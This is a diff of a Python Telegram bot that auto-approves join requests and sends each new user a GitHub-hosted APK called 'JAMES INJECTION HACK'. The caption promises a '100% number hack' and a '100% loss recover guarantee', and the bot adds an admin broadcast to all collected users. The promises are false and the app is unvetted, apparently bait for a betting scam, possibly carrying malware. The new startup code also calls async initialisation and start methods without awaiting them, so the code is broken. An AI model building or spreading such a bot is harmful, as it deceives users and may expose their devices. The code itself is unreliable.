@@ -1,97 +1,127 @@
 import os
-from telegram import Update
+import logging
+from flask import Flask, request
+from telegram import Update, Bot
 from telegram.ext import (
-    ApplicationBuilder,
+    Application,
     ChatJoinRequestHandler,
     MessageHandler,
     ContextTypes,
     filters,
 )
-from flask import Flask, request
-import asyncio
 
+# 🔥 ENV VARIABLES
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID"))
 
-APK_LINK = "https://raw.githubusercontent.com/loda26616-a11y/JAMES-/1db4bc6a4a7b78311162a7c798e49147eaa4a3e7/JAMES%20INJECTION%20HACK_1.0_0%20(1).apk"
-
+# 🔥 USERS STORAGE
 users = set()
 
-flask_app = Flask(__name__)
-telegram_app = ApplicationBuilder().token(BOT_TOKEN).build()
+# 🔥 APK DATA
+APK_LINK = "https://raw.githubusercontent.com/loda26616-a11y/JAMES-/1db4bc6a4a7b78311162a7c798e49147eaa4a3e7/JAMES%20INJECTION%20HACK_1.0_0%20(1).apk"
+
+APK_CAPTION = """
+✅ 100% NUMBER HACK 💥
+
+( ONLY FOR PREMIUM USERS ⚡️ )
+( 100% LOSS RECOVER GUARANTEE ⚡️ )
+
+𝐇𝐎𝐖 𝐓𝐎 𝐔𝐒𝐄 :- https://t.me/HOW_TO_USE_JAMES_HACK/6
+
+FOR HELP @M4JAMES_HACK_MANAGER
+"""
+
+# 🔥 LOGGING
+logging.basicConfig(level=logging.INFO)
+
+# 🔥 FLASK APP
+app = Flask(__name__)
+
+# 🔥 TELEGRAM APPLICATION
+application = Application.builder().token(BOT_TOKEN).build()
 
 
-# ✅ Handlers
+# ✅ JOIN REQUEST HANDLER
 async def approve_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         user = update.chat_join_request.from_user
         chat_id = update.chat_join_request.chat.id
 
         await context.bot.approve_chat_join_request(chat_id, user.id)
+
         users.add(user.id)
 
+        # Welcome msg
         await context.bot.send_message(
             chat_id=user.id,
             text="✨ WELCOME TO JAMES PREMIUM BOT ✨\n\nAccess Granted 🚀"
         )
 
+        # Send APK
         await context.bot.send_document(
             chat_id=user.id,
             document=APK_LINK,
-            caption="✅ APK FILE"
+            caption=APK_CAPTION
         )
 
+        print(f"Approved: {user.id}")
+
     except Exception as e:
-        print("Approve error:", e)
+        print(f"Join Error: {e}")
 
 
+# ✅ BROADCAST
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
-        return
-
-    for user_id in users:
-        try:
-            await context.bot.copy_message(
-                chat_id=user_id,
-                from_chat_id=update.effective_chat.id,
-                message_id=update.message.id
-            )
-        except Exception as e:
-            print("Broadcast error:", e)
-
-
-telegram_app.add_handler(ChatJoinRequestHandler(approve_request))
-telegram_app.add_handler(MessageHandler(filters.ALL, broadcast))
-
-
-# ✅ Webhook route
-@flask_app.route(f"/{BOT_TOKEN}", methods=["POST"])
-def webhook():
     try:
-        data = request.get_json(force=True)
-        update = Update.de_json(data, telegram_app.bot)
+        if update.effective_user.id != ADMIN_ID:
+            return
 
-        asyncio.run(telegram_app.process_update(update))
-        return "ok"
+        for user_id in users:
+            try:
+                await context.bot.copy_message(
+                    chat_id=user_id,
+                    from_chat_id=update.effective_chat.id,
+                    message_id=update.message.id
+                )
+            except Exception as e:
+                print(f"Broadcast Error: {e}")
+
     except Exception as e:
-        print("Webhook error:", e)
-        return "error"
+        print(f"Broadcast Main Error: {e}")
 
 
-# ✅ Home route
-@flask_app.route("/")
+# ✅ ERROR HANDLER
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
+    print(f"ERROR: {context.error}")
+
+
+# 🔥 ADD HANDLERS
+application.add_handler(ChatJoinRequestHandler(approve_request))
+application.add_handler(MessageHandler(filters.ALL, broadcast))
+application.add_error_handler(error_handler)
+
+
+# ✅ WEBHOOK ROUTE
+@app.route(f"/webhook", methods=["POST"])
+def webhook():
+    update = Update.de_json(request.get_json(force=True), application.bot)
+    application.update_queue.put_nowait(update)
+    return "ok"
+
+
+# ✅ HOME ROUTE (IMPORTANT FOR RENDER)
+@app.route("/")
 def home():
-    return "Bot Running 🚀"
+    return "Bot is running 🚀"
 
 
-# 🔥 IMPORTANT STARTUP
-async def start_bot():
-    await telegram_app.initialize()
-    await telegram_app.start()
-
-asyncio.run(start_bot())
-
-
+# 🔥 START APP
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))
-    flask_app.run(host="0.0.0.0", port=port)
+    PORT = int(os.environ.get("PORT", 10000))
+
+    # start telegram app (no polling)
+    application.initialize()
+    application.start()
+
+    # run flask
+    app.run(host="0.0.0.0", port=PORT)
